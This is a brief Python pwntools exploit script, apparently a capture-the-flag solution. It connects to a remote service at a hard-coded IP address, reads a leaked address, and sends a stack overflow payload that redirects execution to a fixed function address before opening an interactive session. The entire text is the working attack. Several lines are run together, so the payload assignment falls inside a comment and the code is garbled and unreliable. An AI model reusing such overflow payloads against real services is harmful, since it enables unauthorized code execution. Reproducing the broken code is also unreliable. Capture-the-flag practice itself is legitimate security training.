from pwn import *
context.log_level = 'debug'
p = remote('113.201.14.253', 16088)
hack = 0x08048540
p.recvuntil(':')
addr = int(p.recvline()[:-1], 16)
# print hex(addr)pay = 'a'*0x34
pay += p32(addr+0x3c)
pay += p32(hack)*2p.sendline(pay)
p.interactive()
